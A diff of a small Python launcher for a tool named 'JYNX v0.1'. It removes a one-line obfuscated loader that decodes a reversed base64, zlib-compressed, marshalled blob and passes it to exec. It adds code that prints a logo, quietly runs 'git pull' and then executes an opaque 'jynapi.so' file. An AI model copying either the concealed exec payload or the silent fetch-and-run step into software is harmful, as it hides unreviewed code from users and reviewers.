@@ -1,1 +1,28 @@
-_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'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'))
+import platform
+import os
+import time
+logo = (""" \u001b[37m
+     ██╗██╗   ██╗███╗   ██╗██╗  ██╗
+     ██║╚██╗ ██╔╝████╗  ██║╚██╗██╔╝
+     ██║ ╚████╔╝ ██╔██╗ ██║ ╚███╔╝ 
+██   ██║  ╚██╔╝  ██║╚██╗██║ ██╔██╗ 
+╚█████╔╝   ██║   ██║ ╚████║██╔╝ ██╗
+ ╚════╝    ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝\x1b[38;5;196mv0.1\u001b[37m""")
+def linex():
+     print('===========================================')
+def clear():
+  os.system('clear')
+  print(logo)
+clear()
+linex()
+print('\n\x1b[1;37m\033[1;32;40m>>\x1b[1;97m CHECKING FOR UPDATES \x1b[1;37m')
+bit = platform.architecture()[0]
+if bit == '64bit': print('\x1b[1;37m\033[1;32;40m>>\x1b[1;97m 64 BIT FOUND \x1b[1;37m')
+if bit == '32bit':
+  print('\x1b[1;37m\033[1;32;40m>>\x1b[1;97m 32 BIT FOUND \x1b[1;37m')
+if bit == '16 bit': 
+  print('\x1b[1;37m\033[1;32;40m>>\x1b[1;97m 16 BIT FOUND \x1b[1;37m')
+  print('\x1b[1;96m>>\x1b[1;97m STARTING JYNX GREEN \x1b[1;37m')
+  time.sleep(3)
+os.system('git pull --quiet')
+os.system('python jynapi.so')
